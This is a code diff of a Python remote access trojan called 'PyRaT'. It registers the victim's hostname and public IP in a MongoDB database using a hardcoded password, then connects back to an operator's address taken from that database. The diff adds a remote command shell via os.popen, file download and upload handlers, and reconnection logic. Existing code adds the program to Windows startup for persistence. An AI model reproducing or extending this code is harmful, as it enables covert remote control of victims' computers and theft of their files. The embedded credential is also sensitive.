@@ -7,19 +7,43 @@ import shutil
 import winreg
 import sys
 import getpass
+from time import sleep
+import subprocess
 
 password = "SB5aaHgp2IYtT72e"
 connection_string = f"mongodb+srv://client:{password}@pyratclients.yq8xdfc.mongodb.net/?retryWrites=true&w=majority"
 
-
 temp_id = "TEMP_ID"
 pcname = socket.gethostname()
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 client = MongoClient(connection_string)
+
+mydb = client["PyRaT"]
+mycol = mydb["clients"]
 
 url = 'http://myexternalip.com/raw'
 r = requests.get(url)
 client_ip = r.text
+
+connected = False
+
+
+def shell():
+    print("shell working")
+    while True:
+        command = s.recv(1024).decode("utf-8")
+        if command == "exit":
+            break
+        else:
+            stream = os.popen(command)
+            output = stream.read()
+            print(output)
+            if output == "":
+                s.send(bytes("ok", "utf-8"))
+
+
+            else:
+                s.send(bytes(output, "utf-8"))
 
 
 def addToStartup(srcpath, filename, autostart: bool = True, move: bool = True):
@@ -56,9 +80,9 @@ def addToStartup(srcpath, filename, autostart: bool = True, move: bool = True):
     return True
 
 
-def main():
+def PyRaT():
+    print("connected")
     try:
-        print("connected")
         while True:
             msg = s.recv(1024).decode("utf-8")
             if msg == "/shell":
@@ -78,6 +102,7 @@ def main():
                     addToStartup(path, filename, True)
                 elif adding == "False":
                     addToStartup(path, filename, False)
+
             elif msg == "kill":
                 filename = os.path.basename(sys.argv[0])
                 curpath = sys.argv[0]
@@ -87,39 +112,42 @@ def main():
                 s.close()
                 exit()
 
+            elif "shell" in msg:
+                shell()
+
+            elif msg == 'download':
+                print("download invoked")
+                filename = s.recv(1024).decode("utf-8")
+                print(filename)
+                file = open(f'{filename}', 'rb')
+
+                data = file.read()
+                s.send(data)
+
+
+
+            elif msg == 'upload':
+                filename = s.recv(6000)
+                newfile = open(filename, 'wb')
+                data = s.recv(6000)
+                newfile.write(data)
+                newfile.close()
+
+
             else:
                 print(msg)
-    except:
-        print("disconneced. trying again in 1 minute")
-        gatherinfo()
-
-
-
-
-
-def connecting(ip, port):
-    try:
-        s.connect((ip, port))
-        threading.Thread(target=main, args=()).start()
 
 
     except:
-        print("connection error")
-        print(ip, port)
-        gatherinfo()
-        return()
-
-    s.send(bytes(f"{pcname}", "utf-8"))
+        print("disconnected. trying again in 1 minute")
+        sleep(10)
+        main()
 
 
-
-
-
-def gatherinfo():
-    mydb = client["PyRaT"]
-    mycol = mydb["clients"]
-
-    query = {"_id" : f"{temp_id}" }
+def main():
+    global s
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    query = {"_id": f"{temp_id}"}
 
     info = mycol.find(query)
 
@@ -128,41 +156,40 @@ def gatherinfo():
 
     if info_list["first_connection?"] == True:
         print("sex")
-        myquery = { "first_connection?": True, "name" : "0", "client_ip" : "0" }
-        newvalues = { "$set": { "first_connection?": False, "name": f"{pcname}", "client_ip" : f"{client_ip}" } }
+        myquery = {"first_connection?": True, "name": "0", "client_ip": "0"}
+        newvalues = {"$set": {"first_connection?": False, "name": f"{pcname}", "client_ip": f"{client_ip}"}}
         mycol.update_one(myquery, newvalues)
 
-        for x in mycol.find({},{ "_id": 0, "ip": 1, "port" : 1 }):
+        for x in mycol.find({}, {"_id": 0, "ip": 1, "port": 1}):
             print(x)
-        ip = x["ip"]
-        port = x["port"]
-        print(ip, port)
-        connecting(ip, int(port))
 
         filename = os.path.basename(sys.argv[0])
         curpath = sys.argv[0]
         print(curpath, filename)
         addToStartup(curpath, filename, True)
 
-
     else:
-
-        for x in mycol.find({},{ "_id": 0, "ip": 1, "port" : 1 }):
+        for x in mycol.find({}, {"_id": 0, "ip": 1, "port": 1}):
             print(x)
-        ip = x["ip"]
-        port = x["port"]
+
+    ip = x["ip"]
+    port = x["port"]
+    print(ip, port)
+
+    try:
+        s.connect((ip, int(port)))
+        s.send(bytes(f"{pcname}", "utf-8"))
+
+        threading.Thread(target=PyRaT, args=()).start()
+
+
+    except:
+        print("connection error")
         print(ip, port)
-        connecting(ip, int(port))
+        sleep(5)
+        main()
 
 
-gatherinfo()
-
-
-
-
-
-
-
-
-
+if __name__ == "__main__":
+    main()
 
